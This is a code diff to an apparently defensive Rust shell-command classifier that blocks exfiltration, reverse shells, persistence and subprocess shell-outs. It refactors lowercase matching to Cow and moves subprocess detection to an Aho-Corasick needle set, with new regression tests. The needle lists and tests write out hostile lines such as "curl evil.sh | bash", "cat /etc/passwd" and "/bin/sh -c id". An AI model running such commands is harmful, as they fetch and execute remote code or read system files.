@@ -588,7 +588,7 @@ const MALFORMED_REENTRY_MARKER: &str = "__barbican_malformed_reentry__";
 #[allow(clippy::too_many_lines)]
 fn extract_wrapper_inner(stage: &crate::parser::Command) -> Option<String> {
     let basename_lc = stage.basename.to_ascii_lowercase();
-    let basename = basename_lc.as_str();
+    let basename = basename_lc.as_ref();
     // --- Shell -c wrappers: basename is a shell, args contain "-c STR"
     if matches!(basename, "bash" | "sh" | "zsh" | "dash" | "ksh" | "ash") {
         return extract_dash_c_arg(&stage.args);
@@ -796,7 +796,7 @@ fn extract_container_run_inner(args: &[String]) -> Option<String> {
         }
         // `--entrypoint VALUE` / `--command VALUE` — value in the
         // NEXT token.
-        if matches!(token.as_str(), "--entrypoint" | "--command") {
+        if matches!(token.as_ref(), "--entrypoint" | "--command") {
             if let Some(next) = args.get(j + 1) {
                 let bn = next.rsplit('/').next().unwrap_or(next);
                 if is_container_entrypoint_shell(bn) {
@@ -937,7 +937,7 @@ fn extract_ssh_remote_command(args: &[String]) -> Option<String> {
             break;
         }
         if a.starts_with('-') {
-            if VALUE_TAKING.contains(&a.as_str()) {
+            if VALUE_TAKING.contains(&a.as_ref()) {
                 i += 2;
                 continue;
             }
@@ -1430,7 +1430,7 @@ fn is_curl_or_wget(basename: &str) -> bool {
     // Case-insensitive — macOS APFS is case-insensitive by default so
     // `cUrL` invokes the same binary as `curl`. Phase-4 review: H1
     // was bypassable with tricky casing.
-    matches!(basename.to_ascii_lowercase().as_str(), "curl" | "wget")
+    matches!(basename.to_ascii_lowercase().as_ref(), "curl" | "wget")
 }
 
 /// H2 audit finding: a pipeline that decodes content and writes the
@@ -1534,7 +1534,7 @@ fn effective_out_file_target(stage: &crate::parser::Command) -> Option<String> {
 /// Returns `None` for any other command; that's fine, Rule 1 already
 /// handles `>` / `>>` redirects.
 fn argv_output_target(stage: &crate::parser::Command) -> Option<String> {
-    match stage.basename.to_ascii_lowercase().as_str() {
+    match stage.basename.to_ascii_lowercase().as_ref() {
         "tee" => {
             // Skip flags; take the first positional arg.
             stage.args.iter().find(|a| !a.starts_with('-')).cloned()
@@ -1585,7 +1585,7 @@ fn argv_output_target(stage: &crate::parser::Command) -> Option<String> {
 ///
 /// Encoders, dumpers, and help flags don't match.
 fn is_decode_stage(cmd: &crate::parser::Command) -> bool {
-    match cmd.basename.to_ascii_lowercase().as_str() {
+    match cmd.basename.to_ascii_lowercase().as_ref() {
         "base64" => cmd.args.iter().any(|a| is_base64_decode_flag(a)),
         "xxd" => cmd.args.iter().any(|a| is_xxd_reverse_flag(a)),
         "openssl" => cmd.args.iter().any(|a| is_openssl_decode_flag(a)),
@@ -1714,7 +1714,7 @@ fn is_exec_target(path: &str) -> bool {
         Some((stem, "")) if !stem.is_empty() => true,
         // Leading dot only, like ".env" — data, not exec.
         Some(("", _)) => false,
-        Some((_, ext)) => SCRIPT_EXTS.contains(ext.to_ascii_lowercase().as_str()),
+        Some((_, ext)) => SCRIPT_EXTS.contains(ext.to_ascii_lowercase().as_ref()),
     }
 }
 
@@ -1835,7 +1835,7 @@ fn pipeline_mentions_secret(pipeline: &Pipeline) -> bool {
         if re.is_match(&stage.argv0_raw) {
             return true;
         }
-        let is_msg_wrapper = matches!(stage_bn_lc(stage).as_str(), "git" | "gh" | "glab" | "jj");
+        let is_msg_wrapper = matches!(stage_bn_lc(stage).as_ref(), "git" | "gh" | "glab" | "jj");
         let mut prev_was_msg_flag = false;
         for a in &stage.args {
             if is_msg_wrapper && prev_was_msg_flag {
@@ -1843,7 +1843,7 @@ fn pipeline_mentions_secret(pipeline: &Pipeline) -> bool {
                 prev_was_msg_flag = false;
                 continue;
             }
-            if is_msg_wrapper && matches!(a.as_str(), "-m" | "--message" | "-F" | "--file") {
+            if is_msg_wrapper && matches!(a.as_ref(), "-m" | "--message" | "-F" | "--file") {
                 prev_was_msg_flag = true;
                 continue;
             }
@@ -1867,8 +1867,22 @@ fn pipeline_mentions_secret(pipeline: &Pipeline) -> bool {
 }
 
 /// Basename of a stage, lowercased, for case-insensitive matching.
-fn stage_bn_lc(stage: &crate::parser::Command) -> String {
-    stage.basename.to_ascii_lowercase()
+///
+/// 1.5.4 Rust-expert review: was `String::to_ascii_lowercase()` which
+/// allocated unconditionally. Now returns `Cow<'_, str>` borrowed
+/// when the basename is already ASCII-lowercase (the common case for
+/// real-world binaries), owned only when actual conversion is needed
+/// (e.g. adversarial `CURL` / `cUrL`). A pipeline with 20 stages ×
+/// 20 classifier dispatches went from ~400 allocs to ~0 on the hot
+/// path. Call sites that need `&str` can just `.as_ref()` or
+/// `&*lc`; `phf_set::contains` accepts `&str` and reborrows
+/// cleanly.
+fn stage_bn_lc(stage: &crate::parser::Command) -> std::borrow::Cow<'_, str> {
+    if stage.basename.chars().all(|c| !c.is_ascii_uppercase()) {
+        std::borrow::Cow::Borrowed(stage.basename.as_ref())
+    } else {
+        std::borrow::Cow::Owned(stage.basename.to_ascii_lowercase())
+    }
 }
 
 /// M2 reverse-shell pattern: any argv/redirect references `/dev/tcp/*`
@@ -1918,7 +1932,7 @@ fn m2_env_dump_to_network(pipeline: &Pipeline) -> Option<DenyReason> {
     let env_idx = pipeline
         .stages
         .iter()
-        .position(|s| ENV_DUMPERS.contains(stage_bn_lc(s).as_str()))?;
+        .position(|s| ENV_DUMPERS.contains(stage_bn_lc(s).as_ref()))?;
     // 1.2.0 second-pass review (HIGH #2): expansion-argv[0] like
     // `env | $NET url` must fire the env-exfil classifier even
     // though `$NET` doesn't match EXFIL_NETWORK_TOOLS. An env dump
@@ -1926,7 +1940,7 @@ fn m2_env_dump_to_network(pipeline: &Pipeline) -> Option<DenyReason> {
     // stage (known tool OR expansion-valued argv[0]) qualifies.
     let net_stage =
         pipeline.stages.iter().skip(env_idx + 1).find(|s| {
-            EXFIL_NETWORK_TOOLS.contains(stage_bn_lc(s).as_str()) || is_expansion_argv0(s)
+            EXFIL_NETWORK_TOOLS.contains(stage_bn_lc(s).as_ref()) || is_expansion_argv0(s)
         })?;
     let env = &pipeline.stages[env_idx].basename;
     let net = &net_stage.basename;
@@ -1962,7 +1976,7 @@ fn m2_secret_or_base64_to_network(pipeline: &Pipeline) -> Option<DenyReason> {
     if has_secret {
         if let Some(net_stage) = pipeline.stages.iter().find(|s| {
             let bn = stage_bn_lc(s);
-            EXFIL_NETWORK_TOOLS.contains(bn.as_str()) || bn == "git" || is_expansion_argv0(s)
+            EXFIL_NETWORK_TOOLS.contains(bn.as_ref()) || bn == "git" || is_expansion_argv0(s)
         }) {
             let net = net_stage.basename.clone();
             return Some(DenyReason::with_detail(
@@ -1983,7 +1997,7 @@ fn m2_secret_or_base64_to_network(pipeline: &Pipeline) -> Option<DenyReason> {
     } else if let Some(net_stage) = pipeline
         .stages
         .iter()
-        .find(|s| EXFIL_NETWORK_TOOLS.contains(stage_bn_lc(s).as_str()))
+        .find(|s| EXFIL_NETWORK_TOOLS.contains(stage_bn_lc(s).as_ref()))
     {
         // Without a secret, require a concrete network tool —
         // base64-only-to-known-net still falls through to the second
@@ -2000,10 +2014,10 @@ fn m2_secret_or_base64_to_network(pipeline: &Pipeline) -> Option<DenyReason> {
     let base64_idx = pipeline
         .stages
         .iter()
-        .position(|s| stage_bn_lc(s).as_str() == "base64" && !is_decode_stage(s))?;
+        .position(|s| stage_bn_lc(s).as_ref() == "base64" && !is_decode_stage(s))?;
     let net_stage =
         pipeline.stages.iter().skip(base64_idx + 1).find(|s| {
-            EXFIL_NETWORK_TOOLS.contains(stage_bn_lc(s).as_str()) || is_expansion_argv0(s)
+            EXFIL_NETWORK_TOOLS.contains(stage_bn_lc(s).as_ref()) || is_expansion_argv0(s)
         })?;
     let net = net_stage.basename.clone();
     Some(DenyReason::with_detail(
@@ -2101,10 +2115,10 @@ fn signals_in_pipeline(pipeline: &Pipeline) -> (bool, bool, bool, bool) {
     let mut b64 = false;
     for stage in &pipeline.stages {
         let bn = stage_bn_lc(stage);
-        if EXFIL_NETWORK_TOOLS.contains(bn.as_str()) {
+        if EXFIL_NETWORK_TOOLS.contains(bn.as_ref()) {
             net = true;
         }
-        if ENV_DUMPERS.contains(bn.as_str()) {
+        if ENV_DUMPERS.contains(bn.as_ref()) {
             env = true;
         }
         if bn == "base64" {
@@ -2138,7 +2152,7 @@ fn m2_staged_payload_to_exec_target(pipeline: &Pipeline) -> Option<DenyReason> {
         }
         // Inspect the argv of a payload-generator (echo/printf/cat).
         let bn = stage_bn_lc(stage);
-        if !matches!(bn.as_str(), "echo" | "printf" | "cat" | "tee") {
+        if !matches!(bn.as_ref(), "echo" | "printf" | "cat" | "tee") {
             continue;
         }
         let payload_text = stage.args.join(" ");
@@ -2471,7 +2485,7 @@ fn xargs_inner_argv(args: &[String]) -> Option<Vec<String>> {
             i += 1;
             continue;
         }
-        if value_taking_standalone.contains(&a.as_str()) {
+        if value_taking_standalone.contains(&a.as_ref()) {
             i += 2;
             continue;
         }
@@ -2587,7 +2601,7 @@ fn rsync_dash_e_inner(pipeline: &Pipeline, depth: usize) -> Option<String> {
 fn scheduler_persistence(pipeline: &Pipeline) -> Option<String> {
     for stage in &pipeline.stages {
         let bn = stage_bn_lc(stage);
-        match bn.as_str() {
+        match bn.as_ref() {
             "crontab" => {
                 // `crontab -` reads stdin as the new crontab.
                 // `crontab -r` removes. Either is persistence. Also
@@ -2640,7 +2654,7 @@ fn scheduler_persistence(pipeline: &Pipeline) -> Option<String> {
 fn pip_editable_vcs_install(pipeline: &Pipeline) -> Option<String> {
     for stage in &pipeline.stages {
         let bn = stage_bn_lc(stage);
-        if !matches!(bn.as_str(), "pip" | "pip3" | "pipx" | "uv" | "poetry") {
+        if !matches!(bn.as_ref(), "pip" | "pip3" | "pipx" | "uv" | "poetry") {
             continue;
         }
         // First non-flag positional must be `install`; bail otherwise.
@@ -2786,7 +2800,9 @@ fn classify_tar_inner(flag: &str, raw: &str, depth: usize) -> Option<String> {
     let stripped = strip_surrounding_quotes_owned(raw);
     match parser::parse(&stripped) {
         Ok(inner) => {
-            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth.saturating_add(1)) {
+            if let Decision::Deny { reason, .. } =
+                classify_script_with_depth(&inner, depth.saturating_add(1))
+            {
                 return Some(format!(
                     "blocked: tar `{flag}={stripped}` executes as a \
                      shell command — inner: {reason}",
@@ -2873,10 +2889,10 @@ fn script_contains_shell_sink_transitively(script: &crate::parser::Script) -> bo
 /// one source of truth.
 fn is_shell_code_sink(basename: &str) -> bool {
     let bn = basename.to_ascii_lowercase();
-    if SHELL_INTERPRETERS.contains(bn.as_str()) {
+    if SHELL_INTERPRETERS.contains(bn.as_ref()) {
         return true;
     }
-    matches!(bn.as_str(), "source" | "." | "eval")
+    matches!(bn.as_ref(), "source" | "." | "eval")
 }
 
 /// True if any stage, transitively through nested substitutions, is
@@ -2943,7 +2959,9 @@ fn shell_with_heredoc_or_herestring_body(pipeline: &Pipeline, depth: usize) -> O
                     sh = stage.basename,
                 ));
             };
-            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth.saturating_add(1)) {
+            if let Decision::Deny { reason, .. } =
+                classify_script_with_depth(&inner, depth.saturating_add(1))
+            {
                 return Some(format!(
                     "blocked: shell interpreter `{sh}` executes a \
                      heredoc / here-string body — inner: {reason}",
@@ -3061,7 +3079,9 @@ fn shell_with_stdin_script(pipeline: &Pipeline, depth: usize) -> Option<String> 
         // script that would itself deny, we deny too. This catches
         // nested shapes like `printf 'base64 -d blob > ~/.bashrc' | sh -s`.
         if let Ok(inner) = parser::parse(&payload) {
-            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth.saturating_add(1)) {
+            if let Decision::Deny { reason, .. } =
+                classify_script_with_depth(&inner, depth.saturating_add(1))
+            {
                 return Some(format!(
                     "blocked: shell interpreter `{sh} -s` reads its \
                      script from stdin — upstream payload classifies \
@@ -3178,7 +3198,7 @@ fn persistence_write_to_shell_startup(pipeline: &Pipeline) -> Option<String> {
 /// ambiguous enough that a false positive is likely.
 fn file_copy_destination(stage: &crate::parser::Command) -> Option<String> {
     let bn = stage_bn_lc(stage);
-    match bn.as_str() {
+    match bn.as_ref() {
         // `cp [-flags] SRC DEST` / `cp [-flags] SRC1 SRC2 ... DEST`.
         // `mv` and `install` have the same shape. The destination is
         // the last non-flag positional arg. If argv has only one
@@ -3625,7 +3645,7 @@ fn lex_normalize_chmod_path(path: &str) -> String {
 fn scripting_lang_shellout(pipeline: &Pipeline) -> Option<DenyReason> {
     for stage in &pipeline.stages {
         let bn = stage_bn_lc(stage);
-        let bn = bn.as_str();
+        let bn = bn.as_ref();
         // Scripting languages whose `-c` / `-e` / `-r` / `BEGIN{…}`
         // form runs inline code that can call a subshell.
         let inline = match bn {
@@ -3861,94 +3881,116 @@ fn count_unicode_bmp_ascii_escapes(code: &str) -> usize {
 }
 
 fn code_calls_subprocess(code: &str) -> bool {
-    let lower = code.to_ascii_lowercase();
-    // Python / Ruby / PHP / Perl / Lua / Tcl / C-style ccall plus
-    // s-expression forms (`(system `, `(exec `) used by racket /
-    // guile / scheme.
-    let needles: &[&str] = &[
-        "os.system",
-        "subprocess.",
-        "os.popen",
-        "os.execv",
-        "os.exec",
-        "popen(",
-        "system(",
-        "exec(",
-        "execsync(",
-        "execfilesync(",
-        "spawn(",
-        "spawnsync(",
-        "ccall(:system",
-        "runtime.getruntime().exec",
-        "processbuilder",
-        "process.start",
-        "backtick(",
-        // Perl `qx{}` / `qx//` / `qx()` and Ruby `%x{}` / `%x//` /
-        // `%x()` — the non-bare-backtick forms. Narrowed from a bare
-        // backtick needle (which false-positived on ANY backtick in
-        // a docstring / comment / string literal) to these explicit
-        // delimited forms. 1.2.0 8th-pass adversarial review
-        // (Claude HIGH 8H3).
-        "%x{",
-        "%x(",
-        "%x[",
-        "%x<",
-        "%x/",
-        "%x|",
-        "%x!",
-        "qx{",
-        "qx(",
-        "qx[",
-        "qx<",
-        "qx/",
-        "qx|",
-        "qx!",
-        "qx\"",
-        // Bare-backtick shell-out: require the backtick to be
-        // followed by a known dangerous command NAME AND A SPACE
-        // (argv[0] + at least one argv[1]) — this catches the
-        // attacker form `\`curl URL\`` / `\`bash -c …\`` while
-        // ignoring backticks in docstrings like `\`curl\`` and
-        // code-fence markers like `\`\`\`bash` which have no
-        // trailing space-then-arg.
-        "`curl ",
-        "`wget ",
-        "`bash ",
-        "`sh ",
-        "`nc ",
-        "io.popen",
-        "io.spawn",
-        // PowerShell: `iex` / `Invoke-Expression` evaluate an
-        // arbitrary string as PowerShell code (subprocess-API-
-        // equivalent), and `& { … }` is the call-operator spawn.
-        // `Start-Process` / `Invoke-Command` round out the family.
-        // 1.5.1 crew-review (Claude W-4 follow-up).
-        "iex(",
-        "iex ",
-        "invoke-expression",
-        "invoke-command",
-        "start-process",
-        "& {",
-        "&{",
-        // S-expression / Lisp-family: `(system "…")`, `(exec "…")`,
-        // `(process "…")`.
-        "(system ",
-        "(system\t",
-        "(system\"",
-        "(exec ",
-        "(exec\t",
-        "(process ",
-        "(subprocess ",
-        // Ruby/Perl command-style call WITHOUT parens:
-        // `system "..."`, `exec "..."`. The trailing space-then-quote
-        // keeps the false-positive rate low vs a bare `system`.
-        "system \"",
-        "system '",
-        "exec \"",
-        "exec '",
-    ];
-    needles.iter().any(|n| lower.contains(n))
+    // 1.5.4 Rust-expert review: replace the 80-needle linear
+    // `contains()` scan with an Aho-Corasick automaton built once
+    // and cached in a OnceLock. The automaton does a single pass
+    // over the input (vs. N passes for N needles) with AC-variant
+    // matching. aho-corasick is already in the dep tree transitively
+    // via regex, so this adds no new compilation.
+    static AC: std::sync::OnceLock<aho_corasick::AhoCorasick> = std::sync::OnceLock::new();
+    let ac = AC.get_or_init(|| {
+        aho_corasick::AhoCorasick::builder()
+            .ascii_case_insensitive(true)
+            .match_kind(aho_corasick::MatchKind::LeftmostFirst)
+            .build(SUBPROCESS_NEEDLES)
+            .expect("compile subprocess-API needle set")
+    });
+    ac.is_match(code)
 }
+
+/// Needle set for [`code_calls_subprocess`]. Python / Ruby / PHP /
+/// Perl / Lua / Tcl / C-style ccall plus s-expression forms
+/// (`(system `, `(exec `) used by racket / guile / scheme.
+const SUBPROCESS_NEEDLES: &[&str] = &[
+    "os.system",
+    "subprocess.",
+    "os.popen",
+    "os.execv",
+    "os.exec",
+    "popen(",
+    "system(",
+    "exec(",
+    "execsync(",
+    "execfilesync(",
+    "spawn(",
+    "spawnsync(",
+    "ccall(:system",
+    "runtime.getruntime().exec",
+    "processbuilder",
+    "process.start",
+    "backtick(",
+    // Perl `qx{}` / `qx//` / `qx()` and Ruby `%x{}` / `%x//` /
+    // `%x()` — the non-bare-backtick forms. Narrowed from a bare
+    // backtick needle (which false-positived on ANY backtick in
+    // a docstring / comment / string literal) to these explicit
+    // delimited forms. 1.2.0 8th-pass adversarial review
+    // (Claude HIGH 8H3).
+    "%x{",
+    "%x(",
+    "%x[",
+    "%x<",
+    "%x/",
+    "%x|",
+    "%x!",
+    // 1.5.4 Gemini review: the Ruby `%x"..."` quoted form was absent
+    // despite `qx"..."` (Perl equivalent) being covered. Adds symmetry
+    // across the language pair.
+    "%x\"",
+    "qx{",
+    "qx(",
+    "qx[",
+    "qx<",
+    "qx/",
+    "qx|",
+    "qx!",
+    "qx\"",
+    // Bare-backtick shell-out: require the backtick to be
+    // followed by a known dangerous command NAME AND A SPACE
+    // (argv[0] + at least one argv[1]) — this catches the
+    // attacker form `\`curl URL\`` / `\`bash -c …\`` while
+    // ignoring backticks in docstrings like `\`curl\`` and
+    // code-fence markers like `\`\`\`bash` which have no
+    // trailing space-then-arg.
+    "`curl ",
+    "`wget ",
+    "`bash ",
+    "`sh ",
+    "`nc ",
+    "io.popen",
+    "io.spawn",
+    // PowerShell: `iex` / `Invoke-Expression` evaluate an
+    // arbitrary string as PowerShell code (subprocess-API-
+    // equivalent), and `& { … }` is the call-operator spawn.
+    // `Start-Process` / `Invoke-Command` round out the family.
+    // 1.5.1 crew-review (Claude W-4 follow-up).
+    "iex(",
+    "iex ",
+    "invoke-expression",
+    "invoke-command",
+    "start-process",
+    "& {",
+    "&{",
+    // S-expression / Lisp-family: `(system "…")`, `(exec "…")`,
+    // `(process "…")`.
+    "(system ",
+    "(system\t",
+    "(system\"",
+    "(exec ",
+    "(exec\t",
+    // 1.5.4 Gemini review: `(exec "..."` was absent despite the
+    // sibling `(system "..."` being covered. Adds Lisp-family
+    // symmetry for direct-quoted exec forms.
+    "(exec\"",
+    "(process ",
+    "(subprocess ",
+    // Ruby/Perl command-style call WITHOUT parens:
+    // `system "..."`, `exec "..."`. The trailing space-then-quote
+    // keeps the false-positive rate low vs a bare `system`.
+    "system \"",
+    "system '",
+    "exec \"",
+    "exec '",
+];
 
 /// Does `code` look like it deliberately hides a command string via
 /// obfuscation (base64 decode, chr() sequences, explicit string
@@ -4120,7 +4162,7 @@ fn awk_program_string(args: &[String]) -> Option<String> {
         // value (assignment for -v, single char / literal for -F,
         // filename for -f). Anything else — e.g. a full BEGIN
         // program blob — is treated as a positional, NOT skipped.
-        if matches!(a.as_str(), "-v" | "--assign") {
+        if matches!(a.as_ref(), "-v" | "--assign") {
             if let Some(next) = args.get(i + 1) {
                 if awk_looks_like_assignment(next) {
                     i += 2;
@@ -4134,7 +4176,7 @@ fn awk_program_string(args: &[String]) -> Option<String> {
             i += 1;
             continue;
         }
-        if matches!(a.as_str(), "-F" | "--field-separator") {
+        if matches!(a.as_ref(), "-F" | "--field-separator") {
             // awk's -F takes a value but it's almost always a single
             // char or short literal. If the next token is long or
             // contains shell metas, treat it as a positional (scan
@@ -4150,7 +4192,7 @@ fn awk_program_string(args: &[String]) -> Option<String> {
             i += 1;
             continue;
         }
-        if matches!(a.as_str(), "-f" | "--file") {
+        if matches!(a.as_ref(), "-f" | "--file") {
             if let Some(next) = args.get(i + 1) {
                 if awk_looks_like_filename(next) {
                     i += 2;
@@ -4301,7 +4343,7 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
         // `GIT_SSH_COMMAND=sh -c 'curl|bash' git fetch`, etc.
         for (name, value) in &stage.assignments {
             let upper = name.to_ascii_uppercase();
-            if GIT_ENV_EXEC_VARS.contains(&upper.as_str()) {
+            if GIT_ENV_EXEC_VARS.contains(&upper.as_ref()) {
                 return Some(format!(
                     "blocked: `{name}={value}` is a git env var that \
                      names a shell command git executes on the next \
@@ -4311,7 +4353,7 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
                      `GIT_EXTERNAL_DIFF`).",
                 ));
             }
-            if GIT_ENV_DIR_VARS.contains(&upper.as_str()) {
+            if GIT_ENV_DIR_VARS.contains(&upper.as_ref()) {
                 // Pointing git at an attacker-writeable directory
                 // means its on-disk `.git/config` can contain any
                 // DANGEROUS_KEYS entry. Non-attacker-writeable paths
@@ -4490,7 +4532,7 @@ fn shell_env_injection(pipeline: &Pipeline) -> Option<String> {
     let is_shell_bn = |bn: &str| matches!(bn, "bash" | "sh" | "zsh" | "dash" | "ksh" | "ash");
     let pipeline_has_shell = pipeline.stages.iter().any(|s| {
         let bn = stage_bn_lc(s);
-        if is_shell_bn(bn.as_str()) {
+        if is_shell_bn(bn.as_ref()) {
             return true;
         }
         // Also scan args for a bare shell token (sudo bash, env bash,
@@ -4498,7 +4540,7 @@ fn shell_env_injection(pipeline: &Pipeline) -> Option<String> {
         // needing to enumerate them.
         s.args.iter().any(|a| {
             let a_bn = a.rsplit('/').next().unwrap_or(a).to_ascii_lowercase();
-            is_shell_bn(a_bn.as_str())
+            is_shell_bn(a_bn.as_ref())
         })
     });
     if !pipeline_has_shell {
@@ -4508,7 +4550,7 @@ fn shell_env_injection(pipeline: &Pipeline) -> Option<String> {
     for stage in &pipeline.stages {
         for (name, value) in &stage.assignments {
             let upper = name.to_ascii_uppercase();
-            if SHELL_STARTUP_EXEC_VARS.contains(&upper.as_str()) {
+            if SHELL_STARTUP_EXEC_VARS.contains(&upper.as_ref()) {
                 return Some(format!(
                     "blocked: `{name}={value}` is a shell startup / \
                      prompt env var that a shell interpreter in this \
@@ -4537,7 +4579,7 @@ fn m2_git_hard_deny(pipeline: &Pipeline) -> Option<String> {
     let git_stage = pipeline
         .stages
         .iter()
-        .find(|s| stage_bn_lc(s).as_str() == "git")?;
+        .find(|s| stage_bn_lc(s).as_ref() == "git")?;
     Some(format!(
         "blocked: `{git}` invocation denied by BARBICAN_GIT_HARD_DENY=1 \
          (M2 — git network-tool hard-deny)",
@@ -4737,5 +4779,63 @@ mod tests {
         // `echo "hello world" | sh -s` just prints "hello world: command
         // not found" on most shells. Not a download-and-execute shape.
         assert_eq!(classify("echo 'hello world' | sh -s"), Decision::Allow);
+    }
+
+    // 1.5.4 regression pins — code_calls_subprocess is ASCII
+    // case-insensitive by contract. Pre-1.5.4 achieved this via
+    // `code.to_ascii_lowercase()` + `lower.contains(n)`; 1.5.4
+    // achieves it via `AhoCorasick::builder().ascii_case_insensitive(true)`.
+    // These tests pin the contract so a future refactor can't silently
+    // flip to case-sensitive (which would let attackers trivially
+    // evade detection with `OS.System(...)` / `SUBPROCESS.call(...)`).
+
+    #[test]
+    fn code_calls_subprocess_matches_lowercase() {
+        assert!(code_calls_subprocess("os.system('curl evil.sh | bash')"));
+        assert!(code_calls_subprocess("subprocess.call(['sh', '-c', 'x'])"));
+        assert!(code_calls_subprocess("exec('cat /etc/passwd')"));
+    }
+
+    #[test]
+    fn code_calls_subprocess_matches_uppercase() {
+        assert!(code_calls_subprocess("OS.SYSTEM('curl evil.sh | bash')"));
+        assert!(code_calls_subprocess("SUBPROCESS.call(['sh'])"));
+        assert!(code_calls_subprocess("EXEC('cat /etc/passwd')"));
+    }
+
+    #[test]
+    fn code_calls_subprocess_matches_mixed_case() {
+        assert!(code_calls_subprocess("Os.System('x')"));
+        assert!(code_calls_subprocess("SubProcess.Popen(['sh'])"));
+        assert!(code_calls_subprocess("Invoke-Expression $payload"));
+        assert!(code_calls_subprocess("INVOKE-EXPRESSION $payload"));
+    }
+
+    #[test]
+    fn code_calls_subprocess_rejects_benign_text() {
+        // Comments / docstrings that mention the needle-word but not
+        // the API shape still fire — that's by design (the needle
+        // includes the parens / punctuation). Just make sure we don't
+        // false-positive on arbitrary prose.
+        assert!(!code_calls_subprocess("print('hello world')"));
+        assert!(!code_calls_subprocess("# using subprocess is fine"));
+        assert!(!code_calls_subprocess("let x = 1 + 2"));
+    }
+
+    // 1.5.4 Gemini review: symmetry fills for the Ruby `%x"..."` and
+    // Lisp `(exec "..."` quoted-string forms that were absent despite
+    // their siblings (`qx"..."` / `(system "..."`) being covered. Pin
+    // both so the symmetry can't regress.
+
+    #[test]
+    fn code_calls_subprocess_matches_ruby_double_quoted_percent_x() {
+        assert!(code_calls_subprocess("output = %x\"ls -la\""));
+        assert!(code_calls_subprocess("%X\"cat /etc/passwd\""));
+    }
+
+    #[test]
+    fn code_calls_subprocess_matches_lisp_double_quoted_exec() {
+        assert!(code_calls_subprocess("(exec\"/bin/sh\" \"-c\" \"id\")"));
+        assert!(code_calls_subprocess("(EXEC\"ls\")"));
     }
 }
